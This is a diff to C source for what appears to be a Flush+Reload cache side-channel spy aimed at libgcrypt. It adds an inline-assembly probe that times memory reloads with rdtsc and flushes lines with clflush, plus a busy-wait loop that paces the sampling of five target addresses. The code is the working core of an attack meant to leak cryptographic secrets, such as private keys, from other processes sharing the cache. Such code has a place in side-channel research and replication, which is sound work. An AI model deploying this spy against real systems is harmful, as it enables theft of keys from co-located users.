@@ -4,12 +4,41 @@
 #include <sys/mman.h>
 #include <fcntl.h>
 
-#include "asm.h"
-
 int NUM_ADDRS = 5;
 int NUM_SLOTS = 20000;
 int CYCLES = 2500;
 size_t LIBGCRYPT_SIZE = 1048576;
+
+/* Busy wait for a given cycle */
+void busy_wait(int cycle) {
+    volatile long i;
+
+    for(i = 0; i < cycle; i++) {
+        ;
+    }
+}
+
+/* Measure the time to reload the data at a memory address */
+unsigned long probe(char *addr) {
+    volatile unsigned long time;
+
+    __asm__ __volatile__ (
+        " mfence                \n"
+        " lfence                \n"
+        " rdtsc                 \n"
+        " lfence                \n"
+        " movl %%eax, %%esi     \n"
+        " movl (%1), %%eax      \n"
+        " lfence                \n"
+        " rdtsc                 \n"
+        " subl %%esi, %%eax     \n"
+        " clflush 0(%1)         \n"
+        : "=a" (time)
+        : "c" (addr)
+        : "%esi", "%edx");
+
+    return time;
+}
 
 void spy(char *addrs[NUM_ADDRS], unsigned long results[NUM_SLOTS][NUM_ADDRS], int cycles) {
     int i, j;
@@ -17,7 +46,7 @@ void spy(char *addrs[NUM_ADDRS], unsigned long results[NUM_SLOTS][NUM_ADDRS], in
         for(j = 0; j < NUM_ADDRS; j++) {
             results[i][j] = probe(addrs[j]);
         }
-        /* Busy wait to the end of the time slot */
+        /* Busy wait until the end of the time slot */
         busy_wait(cycles);
     }
 }
